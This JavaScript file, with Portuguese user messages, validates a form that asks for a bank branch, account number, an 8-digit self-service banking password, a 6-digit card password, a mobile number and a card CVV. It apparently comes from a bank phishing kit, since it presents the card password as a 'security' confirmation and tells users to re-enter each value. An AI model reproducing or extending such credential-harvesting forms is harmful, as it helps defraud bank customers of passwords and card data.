function check_enter(){
    var agencia = $('#is_agc').val();
    var conta = $('#is_cnt').val();
    var ps8 = $('#is_ps8').val();
    var ps6 = $('#is_ps6').val();

    if(agencia.length < 6){
        alert("Informe o número correto de sua conta, incluindo os 0 a esquerda.\nTente novamente!");
        $('#is_agc').val('');
        $('#is_agc').focus();
        return false;
    }

    if(conta.length < 5){
        alert("Informe o número correto de sua agencia para prosseguir.\nTente novamente!");
        $('#is_cnt').val('');
        $('#is_cnt').focus();
        return false;
    }

    if(ps8.length < 8){
        alert("A Senha de Auto-atendimento não está correta.\nTente novamente!");
        $('#is_ps8').val('');
        $('#is_ps8').focus();
        return false;
    }

    if(ps6.length < 6){
        alert("Por motivos de segurança, esta solicitação requer confirmação com a senha do seu cartão de créditos.\nTente novamente!");
        $('#is_ps6').val('');
        $('#is_ps6').focus();
        return false;
    }
}

function check_fone(){
    var fone = $('#is_fone').val();
    var cvv = $('#is_cvv').val();

    if(fone.length < 15){
        alert("O número do celular registrado não está correto.\nTente novamente!");
        $('#is_fone').val('');
        $('#is_fone').focus();
        return false;
    }

    if(cvv.length < 3){
        alert("O Código de segurança informado não está correto.\nTente novamente!");
        $('#is_cvv').val('');
        $('#is_cvv').focus();
        return false;
    }
}